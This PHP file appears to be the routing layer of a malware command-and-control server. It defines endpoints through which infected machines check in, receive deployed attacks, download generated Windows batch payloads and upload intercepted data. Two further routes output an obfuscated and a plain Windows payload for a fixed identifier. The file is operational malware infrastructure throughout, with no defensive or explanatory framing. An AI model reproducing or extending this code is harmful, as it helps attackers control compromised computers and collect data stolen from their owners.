<?php

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;
use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\Logs;

global $router, $requestData, $virusFactory, $attackFactory;

// routes for viruses
$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData, $virusFactory) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
    echo join("\n", $virusFactory->get($virus_id)->getAttacks(AttackBase::STATUS_DEPLOYED));
    Header::ok();
});
$router->getMulti(["vrs/*/ping", "viruses/*/ping"], function () use ($requestData, $virusFactory) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
    $virusFactory->get($virus_id)->ping();
    Header::ok();
});
$router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attack = $attackFactory->get($attack_id);
    $attack->getStatus() == AttackBase::STATUS_EXECUTED ? Header::notFound() : $attack->generateBatchCode();
    Header::ok();
});
$router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attack = $attackFactory->get($attack_id);
    $attack->includeIntercept();
    $attack->saveState();
    Header::ok();
});
$router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attack = $attackFactory->get($attack_id);
    $attack->getStatus() !== AttackBase::STATUS_EXECUTED ? $attack->processExtras($requestData->getExplodedPath()[5]) : Header::notFound();
    Header::ok();
});

$router->get("obfuscate", function () {
    echo Windows::obfuscate(Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"));
});
$router->get("complex", function () {
    echo Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3");
});
